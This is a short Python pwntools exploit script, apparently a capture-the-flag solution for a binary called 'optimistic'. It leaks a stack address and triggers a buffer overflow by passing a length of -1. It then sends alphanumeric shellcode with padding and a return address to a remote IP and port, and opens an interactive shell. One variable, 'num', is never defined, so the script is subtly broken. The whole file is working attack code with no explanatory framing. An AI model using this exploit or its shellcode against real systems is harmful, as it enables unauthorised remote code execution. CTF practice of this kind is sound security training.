from pwn import *

def main():
    context.log_level = 'DEBUG'
    io = process('./optimistic_patched')
    io = remote('138.68.142.149', 31260)

    context(os='linux', arch='amd64')
    paddingLength = num
    stack_address_offset = -96

    io.sendlineafter(': ', 'y')
    stack_address = io.recvline().decode().strip().split()[-1][2:]
    stack_address = bytes.fromhex(stack_address).rjust(8, b'\x00')
    stack_address = u64(stack_address, endian='big')
    stack_address += stack_address_offset
    log.success(f'Leaked stack address: {p64(stack_address)}')


    shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
    #shellcode = asm(shellcraft.sh())
    padding = b'a' * (paddingLength - len(shellcode))
    payload = shellcode + padding + p64(stack_address)

    io.sendlineafter('Email: ', 'email')
    io.sendlineafter('Age: ', 'age')
    io.sendlineafter('Length of name: ', '-1')
    io.sendafter('Name: ', payload)
    io.interactive()

if __name__ == '__main__':
    main()
